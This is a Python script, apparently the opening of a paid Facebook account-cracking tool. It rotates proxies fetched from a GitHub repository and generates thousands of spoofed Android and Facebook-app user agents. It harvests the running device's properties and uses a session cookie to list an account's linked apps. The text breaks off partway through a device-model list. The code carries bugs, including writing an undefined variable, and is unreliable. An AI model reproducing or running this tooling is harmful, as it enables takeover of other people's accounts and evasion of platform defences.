#DECODE/BY/ELYAS
#FUCKED
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python FKING.py')
import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop	
print('[•] Join My Facebook Group')
os.system('xdg-open https://www.facebook.com/profile.php?id=100090854960457/')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	jf=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in jf:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for jf in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V) {str(gt)}'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	jf=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(jf)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/ {str(gt)}' 
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
        
        
logo=("""\033[1;94m
                                                              
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄
   ⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄
   ⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄
   ⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄
   ⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄
   ⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄
   ⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄
   ⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄
   ⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄
   ⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄
   ⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄
   ⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄
   ⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
=======================================================
\033[1;31m====================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{SAMANDAR KHAN $ BADNAM DA ZMANE }\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{SHARABYANO & RAEES }\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{SAMANDAR177}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{AFG👿😈MAFIA}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93771906853 & +923015948415 }\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mNETWORK \33[1;31m   ┇\033[1;37m{3G, 4G/5G, LTE }\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mCOMMAND \33[1;31m   ┇\033[37;41m{PAID}\33[0;m
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{6.7}\33[0;m                 
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO SAMANDAR KHAN TOOLS\33[0;m
\033[1;33m========= \33[32;33mAFG ≠ 2023 ≠ 64Bit\33[1;33m =========""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = ' [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/11.0.0;nullFBCA/armeabi-v7a:armeabi;] '
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/MMB29T.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#<------[main-ua]---->
def samandar():
    END = 'Mozilla/5.0 (Linux; Android 6.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=2.75,width=720,height=1612};FBLC/en_US;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/SM-J105F;FBSV/6.1.1;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.0 (Linux; U; Android {random.randint(4,13)}; SM-J105F Build/LMY47V.{random.randint(111,999)}.{random.randint(111,999)}) '+END
    return ua

def samandarkhan():
    END = ' [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097191;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;] '
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; GT-I9300 Build/MMB29M.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
FJoya=('GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890',"GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H","GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT